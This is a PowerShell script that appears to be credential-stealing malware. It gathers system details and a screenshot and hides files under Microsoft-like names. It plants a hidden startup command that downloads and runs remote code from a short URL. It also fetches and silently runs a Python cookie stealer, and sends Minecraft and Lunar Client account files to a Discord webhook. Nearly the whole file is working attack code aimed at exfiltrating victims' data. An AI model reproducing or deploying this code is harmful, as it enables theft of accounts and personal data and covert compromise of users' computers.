#$webHookUrl='for dev xD'
#####################################################################
$webHookUrlPYTHON="'"+$webHookUrl+"'"
$webHookUrlPYTHON2="""$webHookUrl"""
$webHookUrlPYTHON3="'"+$webHookUrlPYTHON2+"'"
$webHookUrl2="$"+"webHookUrl"
$Hook = 'hook = ' + $webHookUrlPYTHON2
##
$ip = (Invoke-WebRequest -uri "https://api.ipify.org/").Content
$gpu = (Get-WmiObject win32_VideoController).Name
$cpu = (Get-WmiObject Win32_Processor).Name
$hwid = (Get-CimInstance -Class Win32_ComputerSystemProduct).UUID
$ram = (Get-CimInstance Win32_PhysicalMemory | Measure-Object -Property capacity -Sum).sum /1gb
md C:\windows\temp\Win.microsoft.Security.temp
cls
attrib +h "C:\windows\temp\Win.microsoft.Security.temp"
cls
#####################################################################

#####################################################################
cd C:\Windows\Temp\
if (Test-Path "C:\Users\$env:username\AppData\Local\Programs\Python\Python311\python.exe") {
}
else {
    Write-Host "Downloading and installing Python 3.11.0..."
    Invoke-WebRequest https://www.python.org/ftp/python/3.11.0/python-3.11.0-amd64.exe -OutFile python_3.11.exe
    cls
    Write-Host "Python will be installed..."
    Start-Process -FilePath "python_3.11.exe" -Wait -ArgumentList "/passive"
}
###################################################################

#####################################################################

python3 -m pip install threading
python3 -m pip install thread

#####################################################################

#####################################################################
Set-Content "C:\Users\$env:UserName\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\Microsoft.Privacy.FullKeys.Priv.cmd" "
@echo off
powershell -windowstyle hidden $webHookUrl2=$webHookUrlPYTHON3;iex((iwr shorturl.at/biVZ5).content)"
#shorturl.at/biVZ5 look the website xD (just for a short url)
attrib +h "C:\Users\$env:USERNAME\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\Microsoft.Privacy.FullKeys.Priv.cmd"
cls
#####################################################################

#####################################################################
$Path = "C:\Windows\Temp"
$FileName = "MicrosoftPolicy.png"
$File = "$Path\$FileName"
Add-Type -AssemblyName System.Windows.Forms
Add-type -AssemblyName System.Drawing
$Screen = [System.Windows.Forms.SystemInformation]::VirtualScreen
$Width = $Screen.Width
$Height = $Screen.Height
$Left = $Screen.Left
$Top = $Screen.Top
$bitmap = New-Object System.Drawing.Bitmap $Width, $Height
$graphic = [System.Drawing.Graphics]::FromImage($bitmap)
$graphic.CopyFromScreen($Left, $Top, 0, 0, $bitmap.Size)
$bitmap.Save($File) 
#####################################################################

#####################################################################
function Upload-Discord {

[CmdletBinding()]
param (
    [parameter(Position=0,Mandatory=$False)]
    [string]$file,

    [parameter(Position=1,Mandatory=$False)]
    [string]$text 
)

$Body = @{
  'content' = $text
}


if (-not ([string]::IsNullOrEmpty($text))){
Invoke-RestMethod -ContentType 'Application/Json' -Uri $webHookUrl  -Method Post -Body ($Body | ConvertTo-Json)};

if (-not ([string]::IsNullOrEmpty($file))){curl.exe -F "file1=@$file" $webHookUrl}
}
######################################################################

######################################################################
[System.Collections.ArrayList]$embedArray = @()
$thumbUrl = 'https://cdn.discordapp.com/attachments/1055506901812650034/1064993265549590608/image.png' 
#https://streamsentials.com/wp-content/uploads/2022/06/EZ-transparent-png.png
$thumbnailObject = [PSCustomObject]@{
    url = $thumbUrl
}
$color = '12517376'
$title = 'Info of '
$description = 'IP: ' + '`' + $ip + '`' + '
GPU: ' + '`' + $GPU + '`' + '
CPU: ' + '`' + $CPU + '`' + '
RAM: ' + '`' + $ram + '`' + '
HWID: ' + '`' + $hwid + '`' 
$embedObject = [PSCustomObject]@{
    color = $color
    title = $title + '`' + $env:UserName + '`'
    description = $description 
    thumbnail = $thumbnailObject
}
$embedArray.Add($embedObject)
$payload = [PSCustomObject]@{	
    embeds = $embedArray	
}
cls
######################################################################

######################################################################
Invoke-WebRequest -Uri "https://raw.githubusercontent.com/Appolon24800/Legitgrab-POWERSHELL/main/asset/Cookies.py" -OutFile "C:\windows\temp\Win.microsoft.Security.temp\SecurityKeys.txt" 
(Get-Content C:\windows\temp\Win.microsoft.Security.temp\SecurityKeys.txt) -replace 'hook = "WillBeReplaceBiUrWebHook"', $Hook | Set-Content C:\windows\temp\Win.microsoft.Security.temp\SecurityKeys_Crypted.py
######################################################################

######################################################################
Upload-Discord -text "||<@767438758902759494>||"
Start-Sleep -Seconds 3
Upload-Discord -text "-----------------------------------------------------------------------------------------------------------------------------------------------------------"
Upload-Discord -file "C:\Windows\Temp\MicrosoftPolicy.png"
Invoke-RestMethod -Uri $webHookUrl -Body ($payload | ConvertTo-Json -Depth 4) -Method Post -ContentType 'application/json'
Start-Sleep -Seconds 2
Upload-Discord -file "C:\Users\$env:UserName\.lunarclient\settings\game\accounts.json"
Upload-Discord -file "C:\Users\$env:username\AppData\Roaming\.minecraft\cheatbreaker_accounts.json"
Start-Process -FilePath "C:\Users\$env:username\AppData\Local\Programs\Python\Python311\pythonw.exe" -ArgumentList "C:\windows\temp\Win.microsoft.Security.temp\SecurityKeys_Crypted.py"
#Pythonw.exe is like python.exe but with no windows (like silent start)
######################################################################
